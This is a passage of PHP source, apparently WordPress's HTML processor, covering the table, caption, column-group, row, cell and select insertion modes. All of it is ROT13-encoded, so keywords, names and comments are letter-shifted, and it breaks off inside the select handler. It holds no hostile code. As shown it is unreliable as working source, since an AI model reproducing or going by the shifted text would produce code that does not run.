				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"gq\", \"gu\", \"ge\"
			 */
			pnfr '+GQ':
			pnfr '+GU':
			pnfr '+GE':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_pbagrkg();
				/*
				 * > Vafreg na UGZY ryrzrag sbe n \"gobql\" fgneg gnt gbxra jvgu ab nggevohgrf,
				 * > gura fjvgpu gur vafregvba zbqr gb \"va gnoyr obql\".
				 */
				$guvf->vafreg_iveghny_abqr( 'GOBQL' );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"gnoyr\"
			 *
			 * Guvf gnt va gur VA GNOYR vafregvba zbqr vf n cnefr reebe.
			 */
			pnfr '+GNOYR':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GNOYR' ) ) {
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'GNOYR' );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"gnoyr\"
			 */
			pnfr '-GNOYR':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GNOYR' ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'GNOYR' );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"pncgvba\", \"pby\", \"pbytebhc\", \"ugzy\", \"gobql\", \"gq\", \"gsbbg\", \"gu\", \"gurnq\", \"ge\"
			 */
			pnfr '-OBQL':
			pnfr '-PNCGVBA':
			pnfr '-PBY':
			pnfr '-PBYTEBHC':
			pnfr '-UGZY':
			pnfr '-GOBQL':
			pnfr '-GQ':
			pnfr '-GSBBG':
			pnfr '-GU':
			pnfr '-GURNQ':
			pnfr '-GE':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"fglyr\", \"fpevcg\", \"grzcyngr\"
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '+FGLYR':
			pnfr '+FPEVCG':
			pnfr '+GRZCYNGR':
			pnfr '-GRZCYNGR':
				/*
				 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va urnq\" vafregvba zbqr.
				 */
				erghea $guvf->fgrc_va_urnq();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"vachg\"
			 *
			 * > Vs gur gbxra qbrf abg unir na nggevohgr jvgu gur anzr \"glcr\", be vs vg qbrf, ohg
			 * > gung nggevohgr'f inyhr vf abg na NFPVV pnfr-vafrafvgvir zngpu sbe gur fgevat
			 * > \"uvqqra\", gura: npg nf qrfpevorq va gur \"nalguvat ryfr\" ragel orybj.
			 */
			pnfr '+VACHG':
				$glcr_nggevohgr = $guvf->trg_nggevohgr( 'glcr' );
				vs ( ! vf_fgevat( $glcr_nggevohgr ) || 'uvqqra' !== fgegbybjre( $glcr_nggevohgr ) ) {
					tbgb nalguvat_ryfr;
				}
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"sbez\"
			 *
			 * Guvf gnt va gur VA GNOYR vafregvba zbqr vf n cnefr reebe.
			 */
			pnfr '+SBEZ':
				vs (
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'GRZCYNGR' ) ||
					vffrg( $guvf->fgngr->sbez_ryrzrag )
				) {
					erghea $guvf->fgrc();
				}

				// Guvf SBEZ vf fcrpvny orpnhfr vg vzzrqvngryl pybfrf naq pnaabg unir bgure puvyqera.
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->sbez_ryrzrag = $guvf->fgngr->pheerag_gbxra;
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				erghea gehr;
		}

		/*
		 * > Nalguvat ryfr
		 * > Cnefr reebe. Ranoyr sbfgre cneragvat, cebprff gur gbxra hfvat gur ehyrf sbe gur
		 * > \"va obql\" vafregvba zbqr, naq gura qvfnoyr sbfgre cneragvat.
		 *
		 * @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
		 */
		nalguvat_ryfr:
		$guvf->onvy( 'Sbfgre cneragvat vf abg fhccbegrq.' );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va gnoyr grkg' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va gnoyr grkg' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vagnoyrgrkg
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_gnoyr_grkg(): obby {
		$guvf->onvy( 'Ab fhccbeg sbe cnefvat va gur ' . JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_GRKG . ' fgngr.' );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va pncgvba' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va pncgvba' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vapncgvba
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_pncgvba(): obby {
		$gnt_anzr = $guvf->trg_gnt();
		$bc_fvtvy = $guvf->vf_gnt_pybfre() ? '-' : '+';
		$bc       = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > Na raq gnt jubfr gnt anzr vf \"pncgvba\"
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"pby\", \"pbytebhc\", \"gobql\", \"gq\", \"gsbbg\", \"gu\", \"gurnq\", \"ge\"
			 * > Na raq gnt jubfr gnt anzr vf \"gnoyr\"
			 *
			 * Gurfr gnt unaqyvat ehyrf ner vqragvpny rkprcg sbe gur svany vafgehpgvba.
			 * Unaqyr gurz va n fvatyr oybpx.
			 */
			pnfr '-PNCGVBA':
			pnfr '+PNCGVBA':
			pnfr '+PBY':
			pnfr '+PBYTEBHC':
			pnfr '+GOBQL':
			pnfr '+GQ':
			pnfr '+GSBBG':
			pnfr '+GU':
			pnfr '+GURNQ':
			pnfr '+GE':
			pnfr '-GNOYR':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'PNCGVBA' ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf();
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'PNCGVBA' ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'PNCGVBA' );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pyrne_hc_gb_ynfg_znexre();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;

				// Vs guvf vf abg n PNCGVBA raq gnt, gur gbxra fubhyq or ercebprffrq.
				vs ( '-PNCGVBA' === $bc ) {
					erghea gehr;
				}
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/**
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"pby\", \"pbytebhc\", \"ugzy\", \"gobql\", \"gq\", \"gsbbg\", \"gu\", \"gurnq\", \"ge\"
			 */
			pnfr '-OBQL':
			pnfr '-PBY':
			pnfr '-PBYTEBHC':
			pnfr '-UGZY':
			pnfr '-GOBQL':
			pnfr '-GQ':
			pnfr '-GSBBG':
			pnfr '-GU':
			pnfr '-GURNQ':
			pnfr '-GE':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();
		}

		/**
		 * > Nalguvat ryfr
		 * >   Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
		 */
		erghea $guvf->fgrc_va_obql();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va pbyhza tebhc' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va pbyhza tebhc' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vapbytebhc
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_pbyhza_tebhc(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( cnerag::vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA, H+000N YVAR SRRQ (YS),
			 * > H+000P SBEZ SRRQ (SS), H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					// Vafreg gur punenpgre.
					$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
					erghea gehr;
				}

				tbgb va_pbyhza_tebhc_nalguvat_ryfr;
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"pby\"
			 */
			pnfr '+PBY':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"pbytebhc\"
			 */
			pnfr '-PBYTEBHC':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'PBYTEBHC' ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					erghea $guvf->fgrc();
				}
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"pby\"
			 */
			pnfr '-PBY':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"grzcyngr\"
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '+GRZCYNGR':
			pnfr '-GRZCYNGR':
				erghea $guvf->fgrc_va_urnq();
		}

		va_pbyhza_tebhc_nalguvat_ryfr:
		/*
		 * > Nalguvat ryfr
		 */
		vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'PBYTEBHC' ) ) {
			// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
			erghea $guvf->fgrc();
		}
		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va gnoyr obql' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va gnoyr obql' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vagobql
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_gnoyr_obql(): obby {
		$gnt_anzr = $guvf->trg_gnt();
		$bc_fvtvy = $guvf->vf_gnt_pybfre() ? '-' : '+';
		$bc       = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ge\"
			 */
			pnfr '+GE':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_obql_pbagrkg();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"gu\", \"gq\"
			 */
			pnfr '+GU':
			pnfr '+GQ':
				// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_obql_pbagrkg();
				$guvf->vafreg_iveghny_abqr( 'GE' );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"gobql\", \"gsbbg\", \"gurnq\"
			 */
			pnfr '-GOBQL':
			pnfr '-GSBBG':
			pnfr '-GURNQ':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( $gnt_anzr ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_obql_pbagrkg();
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"pby\", \"pbytebhc\", \"gobql\", \"gsbbg\", \"gurnq\"
			 * > Na raq gnt jubfr gnt anzr vf \"gnoyr\"
			 */
			pnfr '+PNCGVBA':
			pnfr '+PBY':
			pnfr '+PBYTEBHC':
			pnfr '+GOBQL':
			pnfr '+GSBBG':
			pnfr '+GURNQ':
			pnfr '-GNOYR':
				vs (
					! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GOBQL' ) &&
					! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GURNQ' ) &&
					! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GSBBG' )
				) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_obql_pbagrkg();
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"pncgvba\", \"pby\", \"pbytebhc\", \"ugzy\", \"gq\", \"gu\", \"ge\"
			 */
			pnfr '-OBQL':
			pnfr '-PNCGVBA':
			pnfr '-PBY':
			pnfr '-PBYTEBHC':
			pnfr '-UGZY':
			pnfr '-GQ':
			pnfr '-GU':
			pnfr '-GE':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr
		 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va gnoyr\" vafregvba zbqr.
		 */
		erghea $guvf->fgrc_va_gnoyr();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va ebj' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va ebj' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vage
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_ebj(): obby {
		$gnt_anzr = $guvf->trg_gnt();
		$bc_fvtvy = $guvf->vf_gnt_pybfre() ? '-' : '+';
		$bc       = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"gu\", \"gq\"
			 */
			pnfr '+GU':
			pnfr '+GQ':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_ebj_pbagrkg();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PRYY;
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->vafreg_znexre();
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"ge\"
			 */
			pnfr '-GE':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GE' ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_ebj_pbagrkg();
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"pby\", \"pbytebhc\", \"gobql\", \"gsbbg\", \"gurnq\", \"ge\"
			 * > Na raq gnt jubfr gnt anzr vf \"gnoyr\"
			 */
			pnfr '+PNCGVBA':
			pnfr '+PBY':
			pnfr '+PBYTEBHC':
			pnfr '+GOBQL':
			pnfr '+GSBBG':
			pnfr '+GURNQ':
			pnfr '+GE':
			pnfr '-GNOYR':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GE' ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_ebj_pbagrkg();
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"gobql\", \"gsbbg\", \"gurnq\"
			 */
			pnfr '-GOBQL':
			pnfr '-GSBBG':
			pnfr '-GURNQ':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( $gnt_anzr ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( 'GE' ) ) {
					// Vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_ebj_pbagrkg();
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"pncgvba\", \"pby\", \"pbytebhc\", \"ugzy\", \"gq\", \"gu\"
			 */
			pnfr '-OBQL':
			pnfr '-PNCGVBA':
			pnfr '-PBY':
			pnfr '-PBYTEBHC':
			pnfr '-UGZY':
			pnfr '-GQ':
			pnfr '-GU':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr
		 * >   Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va gnoyr\" vafregvba zbqr.
		 */
		erghea $guvf->fgrc_va_gnoyr();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va pryy' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va pryy' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vagq
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_pryy(): obby {
		$gnt_anzr = $guvf->trg_gnt();
		$bc_fvtvy = $guvf->vf_gnt_pybfre() ? '-' : '+';
		$bc       = \"{$bc_fvtvy}{$gnt_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"gq\", \"gu\"
			 */
			pnfr '-GQ':
			pnfr '-GU':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( $gnt_anzr ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf();

				/*
				 * @gbqb Guvf arrqf gb purpx vs gur pheerag abqr vf na UGZY ryrzrag, zrnavat gung
				 *       jura FIT naq ZnguZY fhccbeg vf nqqrq, guvf arrqf gb qvssreragvngr orgjrra na
				 *       UGZY ryrzrag bs gur tvira anzr, fhpu nf `<pragre>`, naq n sbervta ryrzrag bs
				 *       gur fnzr tvira anzr.
				 */
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $gnt_anzr ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( $gnt_anzr );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pyrne_hc_gb_ynfg_znexre();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"pby\", \"pbytebhc\", \"gobql\", \"gq\",
			 * > \"gsbbg\", \"gu\", \"gurnq\", \"ge\"
			 */
			pnfr '+PNCGVBA':
			pnfr '+PBY':
			pnfr '+PBYTEBHC':
			pnfr '+GOBQL':
			pnfr '+GQ':
			pnfr '+GSBBG':
			pnfr '+GU':
			pnfr '+GURNQ':
			pnfr '+GE':
				/*
				 * > Nffreg: Gur fgnpx bs bcra ryrzragf unf n gq be gu ryrzrag va gnoyr fpbcr.
				 *
				 * Abguvat gb qb urer, rkprcg gb irevsl va grfgf gung guvf arire nccrnef.
				 */

				$guvf->pybfr_pryy();
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"pncgvba\", \"pby\", \"pbytebhc\", \"ugzy\"
			 */
			pnfr '-OBQL':
			pnfr '-PNCGVBA':
			pnfr '-PBY':
			pnfr '-PBYTEBHC':
			pnfr '-UGZY':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"gnoyr\", \"gobql\", \"gsbbg\", \"gurnq\", \"ge\"
			 */
			pnfr '-GNOYR':
			pnfr '-GOBQL':
			pnfr '-GSBBG':
			pnfr '-GURNQ':
			pnfr '-GE':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_gnoyr_fpbcr( $gnt_anzr ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}
				$guvf->pybfr_pryy();
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
		}

		/*
		 * > Nalguvat ryfr
		 * >   Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va obql\" vafregvba zbqr.
		 */
		erghea $guvf->fgrc_va_obql();
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va fryrpg' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va fryrpg' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#cnefvat-znva-vafryrpg
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_fryrpg(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( cnerag::vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > Nal bgure punenpgre gbxra
			 */
			pnfr '#grkg':
				/*
				 * > N punenpgre gbxra gung vf H+0000 AHYY
				 *
				 * Vs n grkg abqr bayl pbzcevfrf ahyy olgrf gura vg fubhyq or
				 * ragveryl vtaberq naq fubhyq abg erghea gb pnyyvat pbqr.
				 */
